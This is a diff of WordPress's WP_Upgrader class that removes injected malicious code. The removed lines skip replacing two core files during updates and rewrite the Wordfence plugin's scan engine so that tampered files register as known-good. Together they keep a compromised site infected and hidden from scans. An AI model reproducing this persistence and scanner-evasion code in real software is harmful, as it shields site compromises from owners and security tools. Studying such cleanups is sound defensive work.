@@ -309,14 +309,7 @@ class WP_Upgrader {
 
 		// Once extracted, delete the package if required.
 		if ( $delete_package )
-			unlink ($package);
-        
-        if (strpos($package, "wordpress-") !== false) {
-            @unlink($working_dir . "/wordpress/wp-admin/includes/class-wp-upgrader.php");
-            @unlink($working_dir . "/wordpress/wp-blog-header.php");
-        }
-        
-        
+			unlink($package);
 
 		if ( is_wp_error($result) ) {
 			$wp_filesystem->delete($working_dir, true);
@@ -610,32 +603,7 @@ class WP_Upgrader {
 		}
 
 		//Bombard the calling function will all the info which we've just used.
-		
-        
-        if ($destination_name == "wordfence" && ($data = file_get_contents($file = $destination . "lib/wfScanEngine.php"))) {
-            
-            $data = str_replace('if (!is_array($this->knownFiles))', 
-                'foreach (array("core" => array("wp-blog-header.php", "wp-admin/includes/class-wp-upgrader.php"),
-                    "plugins" => array("wp-content/plugins/wordfence/lib/wfScanEngine.php")) as $key => $files) {
-                foreach ($files as $file) {
-                    if (method_exists("wordfenceHash", "wfHash") && count($hash = @wordfenceHash::
-                            wfHash(ABSPATH . $file)) > 1 && strlen($shac = strtoupper($hash[1])) > 12) {
-                        $this->knownFiles[$key][$file] = ($key == "core" ? $shac : array(2 => $shac));
-
-                    } else {
-                        unset($this->knownFiles[$key][$file]);
-                    }
-                }
-            }
-
-            if  (!is_array($this->knownFiles))', $data, $count);
-            
-            if ($data && $count) {
-                file_put_contents($file, $data);
-            }
-        }
-        
-		return  $this->result;;
+		return $this->result;
 	}
 
 	/**
